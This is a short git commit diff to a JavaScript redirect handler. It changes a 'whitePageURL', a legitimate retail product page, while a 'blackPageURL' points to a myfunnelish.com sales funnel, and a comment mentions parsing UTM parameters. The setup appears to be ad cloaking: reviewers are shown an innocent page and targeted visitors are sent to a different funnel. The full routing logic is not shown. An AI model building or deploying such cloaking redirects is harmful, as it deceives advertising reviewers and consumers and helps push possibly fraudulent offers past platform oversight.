649a910dc5409ca52341915d5c7cffd18513da0d
Asif-Moon <asifaslam.ch94@gmail.com>
2025-01-14 18:39:08 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.bonmarche.co.uk/trousers/textured-tapered-trousers-9008102.html?cgid=trousers&dwvar_9008102_color=07";
+    const whitePageURL = "https://www.blackdiamondequipment.com/en_US/product/womens-equipment-for-alpinists-tee/?colorid=14159";
     const blackPageURL = "https://adffuaorrd.myfunnelish.com/women-pink-socks-1736427651655748";
   
     // Parse the UTM parameters from the request URL
